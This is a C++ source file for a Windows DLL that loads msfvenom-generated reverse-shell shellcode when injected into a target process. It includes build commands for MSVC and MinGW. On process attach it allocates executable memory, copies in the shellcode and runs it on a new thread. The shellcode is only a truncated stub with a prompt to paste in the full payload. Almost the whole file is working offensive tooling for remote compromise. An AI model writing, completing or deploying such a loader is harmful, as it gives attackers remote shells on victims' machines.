// revshell_sc_dll.cpp — shellcode-wrapping DLL (msfvenom-generated reverse shell)
//
// Same shellcode as revshell_sc.cpp, but packaged as a DLL for injection
// into a target process.
//
// Build (MSVC):
//   cl /LD /EHsc /O2 /nologo revshell_sc_dll.cpp /Fe:revshell_sc_dll.dll
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_sc_dll.dll revshell_sc_dll.cpp \
//       -Wl,--subsystem,windows,--kill-at

#include <windows.h>
#include <string.h>

// ===========================================================================
// PASTE MSFVENOM OUTPUT BELOW (replace the stub).
// ===========================================================================
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    // ... replace with full msfvenom buf[] ...
    "\xc3"
    ;

static DWORD WINAPI ShellcodeThread(LPVOID) {
    SIZE_T len = sizeof(shellcode) - 1;

    void* mem = VirtualAlloc(nullptr, len,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;

    memcpy(mem, shellcode, len);
    ((void(*)())mem)();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(nullptr, 0, ShellcodeThread, nullptr, 0, nullptr);
    }
    return TRUE;
}
